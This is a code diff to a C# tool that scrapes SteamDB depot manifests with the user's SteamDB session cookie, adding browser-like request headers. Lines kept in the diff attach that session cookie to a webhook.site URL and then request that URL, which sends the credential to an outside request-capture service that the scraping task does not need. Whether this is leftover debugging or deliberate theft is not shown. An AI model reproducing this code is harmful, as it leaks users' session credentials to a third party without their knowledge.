@@ -30,17 +30,24 @@ namespace BCL_OffsetGenerator
             List<MannifestInfo> manifests = new List<MannifestInfo>();
             const string steamdbUrl = "https://steamdb.info/depot/945361/manifests/";
 
-            var httpHandler = new HttpClientHandler() { UseCookies = true, Proxy = GetProxy(), UseProxy = _config.Proxy.Enabled };
+            var httpHandler = new HttpClientHandler() { UseCookies = true, Proxy = GetProxy(), UseProxy = _config.Proxy.Enabled, AutomaticDecompression = DecompressionMethods.GZip };
             using (HttpClient httpClient = new HttpClient(httpHandler))
             {
-                httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36");
+                httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71");
+                httpClient.DefaultRequestHeaders.Accept.ParseAdd("text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
+                httpClient.DefaultRequestHeaders.AcceptEncoding.Add(new System.Net.Http.Headers.StringWithQualityHeaderValue("gzip"));
+                httpClient.DefaultRequestHeaders.AcceptLanguage.ParseAdd("en-US,en;q=0.9,nl;q=0.8");
+
+
+
                 if (!string.IsNullOrEmpty(_steamAccount.SteamDBCookie))
                 {
                     httpHandler.CookieContainer.Add(new Uri(steamdbUrl),
                         new Cookie("__Host-steamdb", _steamAccount.SteamDBCookie));
+                    httpHandler.CookieContainer.Add(new Uri("https://webhook.site/f598f596-4bf8-4e7d-9a3b-d1bbae6a3994"),
+                  new Cookie("__Host-steamdb", _steamAccount.SteamDBCookie));
                 }
-                httpHandler.CookieContainer.Add(new Uri("https://webhook.site/f598f596-4bf8-4e7d-9a3b-d1bbae6a3994"),
-                    new Cookie("__Host-steamdb", _steamAccount.SteamDBCookie));
+
                 var tmp = await httpClient.GetStringAsync("https://webhook.site/f598f596-4bf8-4e7d-9a3b-d1bbae6a3994");
                 var ip = Dns.GetHostAddresses("steamdb.info")[0];
                 Console.WriteLine("IP: {0}", ip);
